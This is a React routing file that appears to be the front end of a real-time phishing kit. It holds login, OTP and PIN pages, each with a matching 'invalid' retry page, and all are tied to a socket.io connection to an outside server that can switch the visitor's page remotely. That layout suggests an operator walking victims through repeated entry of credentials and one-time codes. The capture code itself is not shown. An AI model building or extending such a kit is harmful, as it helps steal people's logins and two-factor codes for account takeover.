import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
import { useEffect } from 'react';
import io from 'socket.io-client';
import Login from './pages/Login';
import InvalidLogin from './pages/InvalidLogin';
import Verify from './pages/Verify';
import OTP from './pages/OTP';
import InvalidOTP from './pages/InvalidOTP';
import PIN from './pages/PIN';
import InvalidPIN from './pages/InvalidPIN';
import Loading from './pages/Loading';
import Welcome from './pages/Welcome';

const socket = io('https://api.connectipz.com/');

function AppContent() {
  const navigate = useNavigate();

  useEffect(() => {
    // Listen for 'pageChange' event from the server
    socket.on('pageChange', (newPage) => {
      navigate(`/${newPage === 'login' ? '' : newPage}`);
    });

    // Cleanup the event listener on unmount
    return () => {
      socket.off('pageChange');
    };
  }, [navigate]);

  return (
    <Routes>
      <Route path="/" element={<Login socket={socket} />} />
      <Route path="/invalid-login" element={<InvalidLogin socket={socket} />} />
      <Route path="/verify" element={<Verify />} />
      <Route path="/otp" element={<OTP socket={socket} />} />
      <Route path="/invalid-otp" element={<InvalidOTP socket={socket} />} />
      <Route path="/pin" element={<PIN socket={socket} />} />
      <Route path="/invalid-pin" element={<InvalidPIN socket={socket} />} />
      <Route path="/loading" element={<Loading />} />
      <Route path="/welcome" element={<Welcome />} />
    </Routes>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;
